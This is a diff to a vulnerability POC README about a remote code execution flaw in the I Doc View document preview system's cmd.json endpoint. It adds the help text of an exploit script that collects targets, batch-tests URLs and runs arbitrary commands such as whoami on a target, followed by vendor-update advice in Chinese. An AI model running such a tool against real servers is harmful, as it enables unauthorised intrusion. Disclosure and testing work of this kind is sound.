@@ -20,8 +20,28 @@ Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
 Connection: close
 ```
 
+![Image text](https://github.com/YUUKI4O4/POC/blob/main/i_Doc_View_cmd_json-RCE/1.png)
 
+### 测试和利用脚本  
+```
+python3 i_Doc_View_cmd_json-RCE.py -h
+usage: i_Doc_View_cmd_json-RCE.py [-h] [-t] [-r FILE] [-u URL] [-c URL CMD]
 
+### I Doc View Online Document Preview System cms.json has RCE vulnerability. ###
+
+options:
+  -h, --help            show this help message and exit
+  -t, --target_collection
+                        Perform target collection
+  -r FILE, --multi_objective_testing FILE
+                        Perform multi-objective testing. e.g:python i_Doc_View_cmd_json-RCE.py -r
+                        ./url.txt
+  -u URL, --single_objective_testing URL
+                        Perform single-objective testing. e.g:python i_Doc_View_cmd_json-RCE.py -u
+                        http://xxx.xxx.xxx
+  -c URL CMD, --rce URL CMD
+                        Perform RCE. e.g:python i_Doc_View_cmd_json-RCE.py -c http://xxx.xxx.xxx whoami
+```
 
 ### 修复建议  
 1.联系相关软件厂商更新至最新安全版本。  
